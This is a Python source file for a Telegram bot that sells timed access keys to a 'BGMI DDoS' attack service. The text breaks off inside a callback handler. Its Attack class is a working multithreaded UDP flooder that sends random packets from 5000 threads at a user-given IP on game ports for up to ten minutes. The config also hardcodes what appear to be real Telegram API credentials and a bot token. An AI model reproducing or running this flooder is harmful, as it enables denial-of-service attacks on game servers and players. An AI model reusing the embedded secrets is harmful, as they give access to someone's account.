#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
COMMANDS BUTTON FIXED
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
BOT_USERNAME = "BeStChEaT_BGMIDdos_Bot"
BOT_LINK = f"https://t.me/{BOT_USERNAME}"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"
STICKER_DB = "sticker.json"
EMOJI_DB = "emojis.json"
STICKER_TIME_DB = "sticker_times.json"
SETTINGS_DB = "settings.json"
STOP_STICKER_DB = "stop_sticker.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600
DEFAULT_STICKER_TIME = 6
DEFAULT_VIDEO_DELAY = 3
EMOJI_DISPLAY_TIME = 2

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        seconds = diff.seconds % 60
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H {minutes}M", False
        elif hours > 0: return f"{hours}H {minutes}M {seconds}S", False
        elif minutes > 0: return f"{minutes}M {seconds}S", False
        else: return f"{seconds}S", False
    except: return "ERROR", False

# ═══════════════ SETTINGS FUNCTIONS ═══════════════
def get_settings():
    return jload(SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY})

def save_settings(sticker_time=None, video_delay=None):
    settings = get_settings()
    if sticker_time is not None:
        settings["sticker_time"] = sticker_time
    if video_delay is not None:
        settings["video_delay"] = video_delay
    jsave(SETTINGS_DB, settings)
    return settings

def get_sticker_display_time():
    settings = get_settings()
    return settings.get("sticker_time", DEFAULT_STICKER_TIME)

def get_video_delay_time():
    settings = get_settings()
    return settings.get("video_delay", DEFAULT_VIDEO_DELAY)

# ═══════════════ STOP STICKER FUNCTIONS ═══════════════
def get_stop_sticker():
    data = jload(STOP_STICKER_DB, {"sticker_id": None})
    return data.get("sticker_id")

def set_stop_sticker(sticker_id):
    jsave(STOP_STICKER_DB, {"sticker_id": sticker_id})
    return True

def clear_stop_sticker():
    jsave(STOP_STICKER_DB, {"sticker_id": None})
    return True

# ═══════════════ STICKER TIME FUNCTIONS ═══════════════
def get_sticker_times():
    return jload(STICKER_TIME_DB, {})

def save_sticker_time(sticker_id, duration):
    data = get_sticker_times()
    data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True

def get_sticker_time(sticker_id):
    data = get_sticker_times()
    return data.get(sticker_id, get_sticker_display_time())

def set_all_sticker_times(duration):
    stickers = get_all_stickers()
    if not stickers:
        return False, 0
    data = get_sticker_times()
    for sticker_id in stickers:
        data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True, len(stickers)

# ═══════════════ EMOJI FUNCTIONS ═══════════════
def get_emojis():
    data = jload(EMOJI_DB, {"emojis": []})
    return data

def add_emoji(emoji_id):
    data = get_emojis()
    if emoji_id not in data["emojis"]:
        data["emojis"].append(emoji_id)
        jsave(EMOJI_DB, data)
        return True, len(data["emojis"])
    return False, len(data["emojis"])

def remove_emoji(index):
    data = get_emojis()
    if 0 <= index < len(data["emojis"]):
        removed = data["emojis"].pop(index)
        jsave(EMOJI_DB, data)
        return True, removed, len(data["emojis"])
    return False, None, len(data["emojis"])

def get_random_emoji():
    global last_emoji_index
    data = get_emojis()
    if data["emojis"]:
        if len(data["emojis"]) > 1:
            available = [i for i in range(len(data["emojis"])) if i != last_emoji_index]
            if available:
                last_emoji_index = random.choice(available)
                return data["emojis"][last_emoji_index]
        last_emoji_index = 0
        return data["emojis"][0]
    return None

def get_all_emojis():
    return get_emojis()["emojis"]

def reset_emojis():
    jsave(EMOJI_DB, {"emojis": []})
    return True

# ═══════════════ STICKER FUNCTIONS ═══════════════
def get_stickers():
    data = jload(STICKER_DB, {"stickers": []})
    return data

def add_sticker(sticker_id, duration=None):
    data = get_stickers()
    if sticker_id not in data["stickers"]:
        data["stickers"].append(sticker_id)
        jsave(STICKER_DB, data)
        if duration:
            save_sticker_time(sticker_id, duration)
        return True, len(data["stickers"])
    return False, len(data["stickers"])

def remove_sticker(index):
    data = get_stickers()
    if 0 <= index < len(data["stickers"]):
        removed = data["stickers"].pop(index)
        jsave(STICKER_DB, data)
        return True, removed, len(data["stickers"])
    return False, None, len(data["stickers"])

def get_random_sticker():
    global last_sticker_index
    data = get_stickers()
    if data["stickers"]:
        if len(data["stickers"]) > 1:
            available = [i for i in range(len(data["stickers"])) if i != last_sticker_index]
            if available:
                last_sticker_index = random.choice(available)
                return data["stickers"][last_sticker_index]
        last_sticker_index = 0
        return data["stickers"][0]
    return None

def get_all_stickers():
    return get_stickers()["stickers"]

def reset_stickers():
    jsave(STICKER_DB, {"stickers": []})
    jsave(STICKER_TIME_DB, {})
    return True

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    jsave(VIDEO_DB, vids)
    return vid

def rand_vid():
    global last_video_index
    vids = get_vids()
    if not vids:
        return None
    if len(vids) > 1:
        available = [v for v in vids if v["id"] != last_video_index]
        if available:
            chosen = random.choice(available)
            last_video_index = chosen["id"]
            return chosen
    chosen = random.choice(vids)
    last_video_index = chosen["id"]
    return chosen

def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False

def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()

def check_access(uid):
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "PREMIUM"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"KEY ({r})"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "NONE"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)

def remove_expired():
    u = get_users(); removed = 0
    if "keys" in u:
        exp = [uid for uid, data in u["keys"].items() if datetime.now(IST) >= datetime.fromisoformat(data["expiry"])]
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    if str(uid) not in h: h[str(uid)] = []
    h[str(uid)].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[str(uid)]) > 50: h[str(uid)] = h[str(uid)][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    return get_history().get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, None
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "active": True}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "Invalid key!"
    key = keys[key_code]
    if not key["active"]: return False, "Key already used!"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("final_bgmi_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ STYLISH TEXT HELPERS ═══════════════
def style1_smallcaps(text):
    chars = {
        'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ',
        'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
        's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
        'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
        'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style2_greek(text):
    chars = {
        'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'ι',
        'j':'נ','k':'κ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я',
        's':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'z',
        'A':'α','B':'в','C':'¢','D':'∂','E':'є','F':'f','G':'g','H':'н','I':'ι',
        'J':'נ','K':'κ','L':'ℓ','M':'м','N':'η','O':'σ','P':'ρ','Q':'q','R':'я',
        'S':'ѕ','T':'т','U':'υ','V':'ν','W':'ω','X':'χ','Y':'γ','Z':'z'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style3_bolditalic(text):
    chars = {
        'a':'𝒂','b':'𝒃','c':'𝒄','d':'𝒅','e':'𝒆','f':'𝒇','g':'𝒈','h':'𝒉','i':'𝒊',
        'j':'𝒋','k':'𝒌','l':'𝒍','m':'𝒎','n':'𝒏','o':'𝒐','p':'𝒑','q':'𝒒','r':'𝒓',
        's':'𝒔','t':'𝒕','u':'𝒖','v':'𝒗','w':'𝒘','x':'𝒙','y':'𝒚','z':'𝒛',
        'A':'𝑨','B':'𝑩','C':'𝑪','D':'𝑫','E':'𝑬','F':'𝑭','G':'𝑮','H':'𝑯','I':'𝑰',
        'J':'𝑱','K':'𝑲','L':'𝑳','M':'𝑴','N':'𝑵','O':'𝑶','P':'𝑷','Q':'𝑸','R':'𝑹',
        'S':'𝑺','T':'𝑻','U':'𝑼','V':'𝑽','W':'𝑾','X':'𝑿','Y':'𝒀','Z':'𝒁'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style4_script(text):
    chars = {
        'a':'𝓪','b':'𝓫','c':'𝓬','d':'𝓭','e':'𝓮','f':'𝓯','g':'𝓰','h':'𝓱','i':'𝓲',
        'j':'𝓳','k':'𝓴','l':'𝓵','m':'𝓶','n':'𝓷','o':'𝓸','p':'𝓹','q':'𝓺','r':'𝓻',
        's':'𝓼','t':'𝓽','u':'𝓾','v':'𝓿','w':'𝔀','x':'𝔁','y':'𝔂','z':'𝔃',
        'A':'𝓐','B':'𝓑','C':'𝓒','D':'𝓓','E':'𝓔','F':'𝓕','G':'𝓖','H':'𝓗','I':'𝓘',
        'J':'𝓙','K':'𝓚','L':'𝓛','M':'𝓜','N':'𝓝','O':'𝓞','P':'𝓟','Q':'𝓠','R':'𝓡',
        'S':'𝓢','T':'𝓣','U':'𝓤','V':'𝓥','W':'𝓦','X':'𝓧','Y':'𝓨','Z':'𝓩'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style5_bold(text):
    chars = {
        'a':'𝐚','b':'𝐛','c':'𝐜','d':'𝐝','e':'𝐞','f':'𝐟','g':'𝐠','h':'𝐡','i':'𝐢',
        'j':'𝐣','k':'𝐤','l':'𝐥','m':'𝐦','n':'𝐧','o':'𝐨','p':'𝐩','q':'𝐪','r':'𝐫',
        's':'𝐬','t':'𝐭','u':'𝐮','v':'𝐯','w':'𝐰','x':'𝐱','y':'𝐲','z':'𝐳',
        'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇','I':'𝐈',
        'J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏','Q':'𝐐','R':'𝐑',
        'S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗','Y':'𝐘','Z':'𝐙'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def premium_text(text, style_num=1):
    styles = {
        1: style1_smallcaps,
        2: style2_greek,
        3: style3_bolditalic,
        4: style4_script,
        5: style5_bold
    }
    styled = styles.get(style_num, style1_smallcaps)(text)
    return f"˹{styled}˼"

# ═══════════════ COMMANDS LIST ═══════════════
def get_commands_list(is_owner=False):
    user_commands = f"""
╔══════════════════════════════════════╗
║         ⌨ {premium_text('COMMANDS LIST', 5)}          ║
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║      👤 {premium_text('USER COMMANDS', 4)}            ║
╚══════════════════════════════════════╝

/start - ✨ {premium_text('BOT START KAREIN', 1)}
/attack - ⚔ {premium_text('ATTACK START KAREIN', 2)}  
/stop - ⛔ {premium_text('ATTACK STOP KAREIN', 3)}
/redeem - ⚿ {premium_text('KEY REDEEM KAREIN', 4)}
/status - 📊 {premium_text('STATUS CHECK KAREIN', 5)}
/commands - 📝 {premium_text('COMMANDS DEKHEIN', 1)}

╔══════════════════════════════════════╗
║      🎯 {premium_text('ATTACK HELP', 2)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /attack IP PORT TIME
{premium_text('Example:', 5)} /attack 1.2.3.4 8080 600
{premium_text('BGMI Ports:', 5)} 7000 - 15000
{premium_text('Max Time:', 5)} 600 {premium_text('Seconds', 1)} (10 {premium_text('Minutes', 1)})

╔══════════════════════════════════════╗
║      🔑 {premium_text('REDEEM HELP', 3)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /redeem KEY_CODE
{premium_text('Example:', 5)} /redeem BGMI-XXXX-XXXX-XXXX

╔══════════════════════════════════════╗
║      ⏱ {premium_text('DURATIONS', 1)}                 ║
╚══════════════════════════════════════╝

{premium_text('30m', 2)} - 30 {premium_text('Minutes', 1)}
{premium_text('1h', 3)} - 1 {premium_text('Hour', 1)}
{premium_text('24h', 4)} - 24 {premium_text('Hours', 1)}
{premium_text('7d', 5)} - 7 {premium_text('Days', 1)}
{premium_text('2w', 1)} - 2 {premium_text('Weeks', 1)}
{premium_text('1mo', 2)} - 1 {premium_text('Month', 1)}
{premium_text('3mo', 3)} - 3 {premium_text('Months', 1)}

"""
    
    owner_commands = f"""
╔══════════════════════════════════════╗
║      ⚜ {premium_text('OWNER COMMANDS', 5)}            ║
╚══════════════════════════════════════╝

🎨 {premium_text('STICKER COMMANDS', 4)}
/addsticker - ⎘ {premium_text('STICKER ADD KAREIN', 1)}
/removesticker - ⌫ {premium_text('STICKER REMOVE KAREIN', 2)}
/liststickers - ⌘ {premium_text('STICKERS DEKHEIN', 3)}
/resetstickers - ↺ {premium_text('STICKERS RESET KAREIN', 4)}
/setstickertime - ⏱ {premium_text('SINGLE STICKER TIME SET', 5)}
/setallstickertime - ⏱ {premium_text('ALL STICKERS TIME SET', 1)}

⛔ {premium_text('STOP STICKER COMMANDS', 5)}
/addstop - ⎘ {premium_text('STOP STICKER ADD KAREIN', 3)}
/removestop - ⌫ {premium_text('STOP STICKER REMOVE KAREIN', 4)}

🎯 {premium_text('EMOJI COMMANDS', 2)}
/addemoji - ⎘ {premium_text('EMOJI ADD KAREIN', 3)}
/removeemoji - ⌫ {premium_text('EMOJI REMOVE KAREIN', 4)}
/listemojis - ⌘ {premium_text('EMOJIS DEKHEIN', 5)}
/resetemojis - ↺ {premium_text('EMOJIS RESET KAREIN', 1)}

🎬 {premium_text('VIDEO COMMANDS', 3)}
/addvideo - ⎘ {premium_text('VIDEO ADD KAREIN', 4)}
/delvideo - ⌫ {premium_text('VIDEO DELETE KAREIN', 5)}
/videos - ⌘ {premium_text('VIDEOS DEKHEIN', 1)}
/clearvideos - ⎚ {premium_text('VIDEOS CLEAR KAREIN', 2)}
/setvideodelay - ⏱ {premium_text('VIDEO DELAY SET KAREIN', 3)}

🔑 {premium_text('KEY COMMANDS', 4)}
/genkey - ⚿ {premium_text('KEY GENERATE KAREIN', 5)}
/admin_keys - ⌘ {premium_text('ALL KEYS DEKHEIN', 1)}
/admin_stats - ⎙ {premium_text('STATISTICS DEKHEIN', 2)}
/admin_clear - ↺ {premium_text('EXPIRED CLEAR KAREIN', 3)}

⚙️ {premium_text('SETTINGS COMMANDS', 3)}
/settings - ⚙️ {premium_text('SHOW SETTINGS', 4)}

╔══════════════════════════════════════╗
║      📲 {premium_text('CONTACT', 5)}                   ║
╚══════════════════════════════════════╝

⚜ {premium_text('Owner:', 5)} {premium_text('FATHER OF BOT', 4)}
🤖 {premium_text('Bot:', 5)} @BeStChEaT_BGMIDdos_Bot

"""
    
    if is_owner:
        return user_commands + owner_commands
    return user_commands

# ═══════════════ BUTTONS ═══════════════
def main_menu_kb(is_owner=False):
    if is_owner:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"⚔ {premium_text('ATTACK', 2)}", callback_data="attack_menu"),
             InlineKeyboardButton(f"⛔ {premium_text('STOP', 1)}", callback_data="stop_attack")],
            [InlineKeyboardButton(f"▓ {premium_text('STATUS', 3)}", callback_data="status_btn"),
             InlineKeyboardButton(f"ⓘ {premium_text('INFO', 4)}", callback_data="info_menu")],
            [InlineKeyboardButton(f"⚿ {premium_text('REDEEM KEY', 5)}", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"⌨ {premium_text('COMMANDS', 1)}", callback_data="commands_menu")],
            [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
            [InlineKeyboardButton(f"▶ {premium_text('VIDEO MANAGER', 3)}", callback_data="video_menu")],
            [InlineKeyboardButton(f"★ {premium_text('EMOJI MANAGER', 4)}", callback_data="emoji_menu")],
            [InlineKeyboardButton(f"❄ {premium_text('STICKER MANAGER', 1)}", callback_data="sticker_menu")],
            [InlineKeyboardButton(f"⚜ {premium_text('ADMIN PANEL', 5)}", callback_data="admin_menu")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"⚔ {premium_text('ATTACK', 2)}", callback_data="attack_menu"),
             InlineKeyboardButton(f"⛔ {premium_text('STOP', 1)}", callback_data="stop_attack")],
            [InlineKeyboardButton(f"▓ {premium_text('STATUS', 3)}", callback_data="status_btn"),
             InlineKeyboardButton(f"ⓘ {premium_text('INFO', 4)}", callback_data="info_menu")],
            [InlineKeyboardButton(f"⚿ {premium_text('REDEEM KEY', 5)}", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"⌨ {premium_text('COMMANDS', 1)}", callback_data="commands_menu")]
        ])

def back_to_menu_kb(is_owner=False):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⚿ {premium_text('ADD KEY', 2)}", callback_data="admin_addkey")],
        [InlineKeyboardButton(f"⚜ {premium_text('AUTO GEN KEY', 3)}", callback_data="admin_auto")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('ALL KEYS', 4)}", callback_data="admin_keys")],
        [InlineKeyboardButton(f"⎙ {premium_text('STATS', 5)}", callback_data="admin_stats")],
        [InlineKeyboardButton(f"↺ {premium_text('CLEAR EXPIRED', 1)}", callback_data="admin_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def video_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD VIDEO', 3)}", callback_data="v_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('DELETE VIDEO', 4)}", callback_data="v_del")],
        [InlineKeyboardButton(f"⎚ {premium_text('CLEAR ALL', 5)}", callback_data="v_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST VIDEOS', 1)}", callback_data="v_list")],
        [InlineKeyboardButton(f"❓ {premium_text('HELP', 2)}", callback_data="v_help")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def emoji_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD EMOJI', 4)}", callback_data="e_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('REMOVE EMOJI', 5)}", callback_data="e_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST EMOJIS', 1)}", callback_data="e_list")],
        [InlineKeyboardButton(f"↺ {premium_text('RESET ALL', 2)}", callback_data="e_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def sticker_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD STICKER', 3)}", callback_data="s_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('REMOVE STICKER', 4)}", callback_data="s_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST STICKERS', 5)}", callback_data="s_list")],
        [InlineKeyboardButton(f"↺ {premium_text('RESET ALL', 1)}", callback_data="s_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def auto_key_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⏱ {premium_text('20 MINUTE', 1)}", callback_data="ak_20m"),
         InlineKeyboardButton(f"⏱ {premium_text('40 MINUTE', 2)}", callback_data="ak_40m"),
         InlineKeyboardButton(f"⏱ {premium_text('60 MINUTE', 3)}", callback_data="ak_60m")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌚ {premium_text('1 DAY', 4)}", callback_data="ak_1d"),
         InlineKeyboardButton(f"⌚ {premium_text('3 DAY', 5)}", callback_data="ak_3d"),
         InlineKeyboardButton(f"⌚ {premium_text('7 DAY', 1)}", callback_data="ak_7d")],
        [InlineKeyboardButton(f"⌚ {premium_text('15 DAY', 2)}", callback_data="ak_15d"),
         InlineKeyboardButton(f"⌚ {premium_text('23 DAY', 3)}", callback_data="ak_23d"),
         InlineKeyboardButton(f"⌚ {premium_text('30 DAY', 4)}", callback_data="ak_30d")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⎚ {premium_text('1 MONTH', 5)}", callback_data="ak_1mo"),
         InlineKeyboardButton(f"⎚ {premium_text('2 MONTH', 1)}", callback_data="ak_2mo"),
         InlineKeyboardButton(f"⎚ {premium_text('3 MONTH', 2)}", callback_data="ak_3mo")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

# ═══════════════ REDEEM POPUP ═══════════════
@app.on_callback_query(filters.regex("redeem_popup"))
async def redeem_popup_callback(client, cb: CallbackQuery):
    await cb.answer(
        f"🪪 {premium_text('About Redeem', 5)} ♡\n\n"
